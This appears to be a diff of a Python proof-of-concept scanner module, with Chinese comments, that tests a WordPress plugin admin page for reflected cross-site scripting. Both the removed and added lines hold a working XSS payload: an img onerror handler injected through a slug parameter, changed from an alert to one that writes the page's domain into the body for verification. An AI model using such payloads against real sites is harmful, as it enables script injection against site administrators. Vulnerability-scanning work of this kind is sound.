@@ -50,11 +50,16 @@ class Poc(ABPoc):
             '/') + '/' + (self.get_option('base_path').lstrip('/'))
         self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
             target=self.target, vuln=self.vuln))
+
         try:
-            path = '{target}/wp-admin/admin.php?page=el_admin_categories&action=delete_bulk&slug[0]=1&slug[1]=2</script><img+src=1+onerror=alert(123321)>'.format(
-                target=self.target)
-            r = requests.get(path)
-            if 'alert(123321)' in r.text:
+            domain_target = urllib.parse.urlparse(self.target).netloc
+            #path = '{target}/wp-admin/admin.php?page=el_admin_categories&action=delete_bulk&slug[0]=1&slug[1]=2</script><img+src=1+onerror=alert(123321)>'.format(target=self.target)
+            #让js执行domain，对domain进行验证
+            url = '%s/wp-admin/admin.php?page=el_admin_categories&action=delete_bulk&slug[0]=1&slug[1]=2</script><img+src=1+onerror=document.getElementsByTagName("body")[0].innerHTML = document.domain+"cert";' % self.target
+            r = requests.get(url)
+            _result = domain_target + 'cert'
+
+            if _result in r.text:
                 self.output.report(self.vuln, '目标{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
         except Exception as e:
